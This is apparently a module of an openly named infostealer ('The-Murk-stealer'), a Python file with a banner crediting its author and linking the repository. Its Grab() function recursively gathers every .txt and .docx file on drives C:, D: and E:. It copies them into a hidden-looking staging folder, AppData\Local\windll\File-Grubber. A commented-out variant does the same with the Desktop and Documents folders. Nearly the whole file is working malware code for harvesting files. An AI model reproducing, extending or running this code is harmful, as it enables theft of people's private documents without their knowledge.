#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

import os
import shutil
import pathlib
import os.path


def CopyDOCX(flist, path, count):
    for i in range (len(flist)):
        count+=1
        try:
            num = flist[i].rfind("\\")
            fname = flist[i][num+1:]
            print(flist[i])
            shutil.copy2(flist[i],rf'{path}\windll\File-Grubber\{fname[:-5]}___{count}.docx')
        except Exception as e:
                print(e)
    print("done")
    return count




def CopyTXT(flist, path, count):
    for i in range (len(flist)):
        count+=1
        try:
            num = flist[i].rfind("\\")
            fname = flist[i][num+1:]
            print(flist[i])
            shutil.copy2(flist[i],rf'{path}\windll\File-Grubber\{fname[:-4]}___{count}.txt')
        except Exception as e:
                print(e)
    print("done")
    return count

def Grab():
    os.chdir("C:")
    try:
        mainPath = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        try:
            os.makedirs(rf'{mainPath}\windll\File-Grubber')
        except:
            pass
        try:
            fileDir = r"C:"
            fileDir1 = r"D:"
            fileDir2 = r"E:"
            fileExt = r"**\*.txt"
            fileExt1 = r"**\*.docx"
            txtCounter = 0
            docxCounter = 0
            print("fg on")
            filesTXT_С = list(str(_) for _ in pathlib.Path(fileDir).glob(fileExt))
            filesDOCX_С = list(str(_) for _ in pathlib.Path(fileDir).glob(fileExt1))
            filesTXT_D = list(str(_) for _ in pathlib.Path(fileDir1).glob(fileExt))
            filesDOCX_D = list(str(_) for _ in pathlib.Path(fileDir1).glob(fileExt1))
            filesTXT_E = list(str(_) for _ in pathlib.Path(fileDir2).glob(fileExt))
            filesDOCX_E = list(str(_) for _ in pathlib.Path(fileDir2).glob(fileExt1))
            try:
               txtCounter= CopyTXT(filesTXT_С,mainPath,txtCounter)
            except Exception as e:
                print(e)
            try:
                docxCounter =CopyDOCX(filesDOCX_С,mainPath,docxCounter)
            except Exception as e:
                print(e)
            try:
                txtCounter=CopyTXT(filesTXT_D,mainPath,txtCounter)
            except Exception as e:
                print(e)
            try:
                docxCounter =CopyDOCX(filesDOCX_D,mainPath,docxCounter)
            except Exception as e:
                print(e)
            try:
                txtCounter=CopyTXT(filesTXT_E,mainPath,txtCounter)
            except Exception as e:
                print(e)
            try:
                docxCounter =CopyDOCX(filesDOCX_E,mainPath,docxCounter)
            except Exception as e:
                print(e)
        except Exception as e:
            print(e)
    except Exception as e:
        print(e)


'''
def Grab():
    try:
        mainPath = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        try:
            os.makedirs(rf'{mainPath}\windll\File-Grubber')
        except:
            pass
        try:
            desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
            documents = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
            try:
                shutil.copytree(desktop ,rf'{mainPath}\windll\File-Grubber\folder_A')
            except Exception as e:
                print(e)
            try:
                shutil.copytree(documents,rf'{mainPath}\windll\File-Grubber\folder_B')
            except Exception as e:
                print(e)

        except Exception as e:
            print(e)
    except:
        pass
'''

